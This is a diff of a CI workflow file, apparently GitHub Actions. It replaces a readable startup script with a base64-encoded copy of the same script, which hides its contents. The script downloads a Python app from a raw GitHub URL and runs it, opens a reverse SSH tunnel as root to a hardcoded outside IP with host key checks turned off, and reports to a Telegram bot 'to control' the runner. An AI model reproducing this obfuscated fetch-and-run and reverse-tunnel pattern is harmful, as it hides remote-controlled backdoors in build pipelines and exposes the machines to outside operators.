@@ -94,38 +94,8 @@ jobs:
           [ -f shutdown.sh ] || printf '#!/bin/bash\n' > shutdown.sh
           chmod +x setup.sh shutdown.sh
           [ -f /tmp/tunnel_key ] && cp /tmp/tunnel_key /mnt/work/tunnel_key && chmod 600 /mnt/work/tunnel_key || true
-          python3 - << 'PYEOF'
-import os
-script = r"""#!/bin/bash
-WORK=/mnt/work
-APP="$WORK/kw_tester_app.py"
-LOG="$WORK/kw_tester.log"
-CFG="$WORK/kw_notify.conf"
-US="129.121.125.186"
-[ -f "$CFG" ] && source "$CFG"
-tg() { [ -n "$TG_TOKEN" ] && curl -s "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d "chat_id=${TG_CHAT}" --data-urlencode "text=$1" >/dev/null 2>&1 || true; }
-echo "=== startup $(date) ==="
-pip3 install flask playwright requests --break-system-packages -q 2>/dev/null || pip3 install flask playwright requests -q 2>/dev/null || true
-python3 -m playwright install chromium 2>/dev/null || true
-[ -f "$APP" ] || curl -fsSL "https://raw.githubusercontent.com/Lillieshaw29-star/test-runner/main/kw_tester_app.py" -o "$APP" || { tg "Runner: download failed"; exit 1; }
-nohup python3 "$APP" 5555 > "$LOG" 2>&1 &
-TPID=$!
-sleep 6
-kill -0 $TPID 2>/dev/null || { tail -20 "$LOG"; tg "Runner: tester failed"; exit 1; }
-if [ -f "$WORK/tunnel_key" ]; then
-  nohup ssh -N -R 5556:localhost:5555 -i "$WORK/tunnel_key" -o StrictHostKeyChecking=no -o ServerAliveInterval=20 -o ServerAliveCountMax=3 root@${US} > "$WORK/tunnel.log" 2>&1 &
-  sleep 4
-  tg "Runner ready - use bot to control"
-else
-  tg "Runner: tester running but tunnel missing"
-fi
-echo "=== done ==="
-"""
-with open('/mnt/work/startup.sh', 'w') as f:
-    f.write(script)
-os.chmod('/mnt/work/startup.sh', 0o755)
-print("startup.sh written")
-PYEOF
+          echo "IyEvYmluL2Jhc2gKV09SSz0vbW50L3dvcmsKQVBQPSIkV09SSy9rd190ZXN0ZXJfYXBwLnB5IgpMT0c9IiRXT1JLL2t3X3Rlc3Rlci5sb2ciCkNGRz0iJFdPUksva3dfbm90aWZ5LmNvbmYiClVTPSIxMjkuMTIxLjEyNS4xODYiClsgLWYgIiRDRkciIF0gJiYgc291cmNlICIkQ0ZHIgp0ZygpIHsgWyAtbiAiJFRHX1RPS0VOIiBdICYmIGN1cmwgLXMgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke1RHX1RPS0VOfS9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9JHtUR19DSEFUfSIgLS1kYXRhLXVybGVuY29kZSAidGV4dD0kMSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWU7IH0KZWNobyAiPT09IHN0YXJ0dXAgJChkYXRlKSA9PT0iCnBpcDMgaW5zdGFsbCBmbGFzayBwbGF5d3JpZ2h0IHJlcXVlc3RzIC0tYnJlYWstc3lzdGVtLXBhY2thZ2VzIC1xIDI+L2Rldi9udWxsIHx8IHBpcDMgaW5zdGFsbCBmbGFzayBwbGF5d3JpZ2h0IHJlcXVlc3RzIC1xIDI+L2Rldi9udWxsIHx8IHRydWUKcHl0aG9uMyAtbSBwbGF5d3JpZ2h0IGluc3RhbGwgY2hyb21pdW0gMj4vZGV2L251bGwgfHwgdHJ1ZQpbIC1mICIkQVBQIiBdIHx8IGN1cmwgLWZzU0wgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9MaWxsaWVzaGF3Mjktc3Rhci90ZXN0LXJ1bm5lci9tYWluL2t3X3Rlc3Rlcl9hcHAucHkiIC1vICIkQVBQIiB8fCB7IHRnICJSdW5uZXI6IGRvd25sb2FkIGZhaWxlZCI7IGV4aXQgMTsgfQpub2h1cCBweXRob24zICIkQVBQIiA1NTU1ID4gIiRMT0ciIDI+JjEgJgpUUElEPSQhCnNsZWVwIDYKa2lsbCAtMCAkVFBJRCAyPi9kZXYvbnVsbCB8fCB7IHRhaWwgLTIwICIkTE9HIjsgdGcgIlJ1bm5lcjogdGVzdGVyIGZhaWxlZCI7IGV4aXQgMTsgfQppZiBbIC1mICIkV09SSy90dW5uZWxfa2V5IiBdOyB0aGVuCiAgbm9odXAgc3NoIC1OIC1SIDU1NTY6bG9jYWxob3N0OjU1NTUgLWkgIiRXT1JLL3R1bm5lbF9rZXkiIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBTZXJ2ZXJBbGl2ZUludGVydmFsPTIwIC1vIFNlcnZlckFsaXZlQ291bnRNYXg9MyByb290QCR7VVN9ID4gIiRXT1JLL3R1bm5lbC5sb2ciIDI+JjEgJgogIHNsZWVwIDQKICB0ZyAiUnVubmVyIHJlYWR5IC0gdXNlIGJvdCB0byBjb250cm9sIgplbHNlCiAgdGcgIlJ1bm5lcjogdGVzdGVyIHJ1bm5pbmcgYnV0IHR1bm5lbCBtaXNzaW5nIgpmaQplY2hvICI9PT0gZG9uZSA9PT0i" | base64 -d > /mnt/work/startup.sh
+          chmod +x /mnt/work/startup.sh
 
       - name: System setup
         run: bash /mnt/work/setup.sh || true
